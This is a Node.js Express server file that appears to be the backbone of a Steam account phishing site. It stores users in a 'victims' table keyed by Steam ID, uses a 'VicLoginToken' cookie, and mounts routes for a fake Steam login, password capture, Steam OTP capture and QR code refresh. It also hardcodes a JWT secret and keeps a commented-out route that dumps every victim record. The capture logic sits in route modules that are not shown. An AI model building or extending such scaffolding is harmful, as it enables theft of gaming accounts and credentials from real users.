
const express = require('express')
const app = express()
app.use(express.json())
const PORT = 4080


const cookieParser = require('cookie-parser');
app.use(cookieParser());
const path = require('path')
const db = require('./routes/config/db.js')
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'public/views'));
const jwt = require('jsonwebtoken');

const JWT_SECRET = 'adgadahadfhshwer234t5346y234rtuiopwdfg9382g138r23g523rgb23cufwepfu';

async function CheckIFloggedIn(req, res, next) {
    try {
        const token = req.cookies.VicLoginToken;
        
        if (!token) {
            return next(); // No token, continue to route
        }

        const decoded = jwt.verify(token, JWT_SECRET);

        const [rows] = await db.execute(
            'SELECT * FROM victims WHERE steamID = ?',
            [decoded.userid]
        );

        if (rows.length === 0) {
            return res.status(403).json({
                success: false,
                message: 'User does not exist'
            });
        }
        
        // Attach user to request
        req.user = {
            ...decoded,
            dbData: rows[0]
        };

        // User is logged in, redirect to UserPersonal
        return res.redirect('/UserPersonal');

    } catch(error) {
        // If token is invalid, just continue to route (like no token)
        if (error instanceof jwt.JsonWebTokenError) {
            return next();
        }
        // For other errors, send 500
        return res.status(500).json({
            success: false,
            message: 'server error'
        });
    }
}







app.get('/' , CheckIFloggedIn ,async(req,res) => {
    try{
        res.sendFile(path.join(__dirname, 'public', 'mainpage', 'index.html'));
    }catch(error){
        res.status(500).json({
            success:false,
            message:'err server'
        })
    }
})


app.get('/Welcome' , CheckIFloggedIn ,async(req,res) => {
    try{
        res.sendFile(path.join(__dirname, 'public', 'Welcome', 'wel.html'));
    }catch(error){
        res.status(500).json({
            success:false,
            message:'err server'
        })
    }
})



// app.get('/test' , async(req,res) => {
//     try{
//         const [useres] = await db.execute('SELECT * FROM victims')
//         res.status(200).json({
//             useres
//         })
//     }catch(error){
//         res.status(500).json({
//             success:false,
//             message:'err server'
//         })
//     }
// })


const sloginroute = require('./routes/steamlogin/steamlogpage.js')
app.use('/Login',sloginroute)

const sloginpassword = require('./routes/steamlogin/sloginpassword.js')
app.use('/Loginwithpass',sloginpassword)

const steamOTP = require('./routes/steamlogin/steamotp.js')
app.use('/steamOTP',steamOTP)


const userspage = require('./routes/userpage/user.js')
app.use('/UserPersonal',userspage)

const refreshqr = require('./routes/qrcode/qrcoderefresh.js')
app.use('/refreshqr',refreshqr)

app.listen(PORT, ()=> {
    console.log(`http://localhost:${PORT}`)
})